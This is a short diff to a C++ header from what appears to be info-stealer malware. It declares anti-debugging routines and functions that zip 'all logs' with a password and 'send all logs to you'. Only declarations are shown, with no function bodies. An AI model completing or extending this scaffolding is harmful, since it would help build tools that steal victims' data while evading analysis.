@@ -23,6 +23,8 @@
 */
 
 // header for access to dir scripts
+#include <string.h>
+#include <iostream>
 
 namespace antidebug {
 	/// <summary>
@@ -40,12 +42,14 @@ namespace manager {
 	/// <summary>
 	/// compresses all logs into .zip with the password
 	/// </summary>
-	void MakeZip();
+	/// <param name="name"></param>
+	/// <param name="pwd"></param>
+	void MakeZip(std::string&, std::string&);
 
 	/// <summary>
 	/// send all logs to you
 	/// </summary>
 	/// <param name="zipName"></param>
 	/// <param name="zipPwd"></param>
-	void Send(const std::string zipName, const std::string zipPwd);
+	void SendLogs(std::string, std::string);
 }
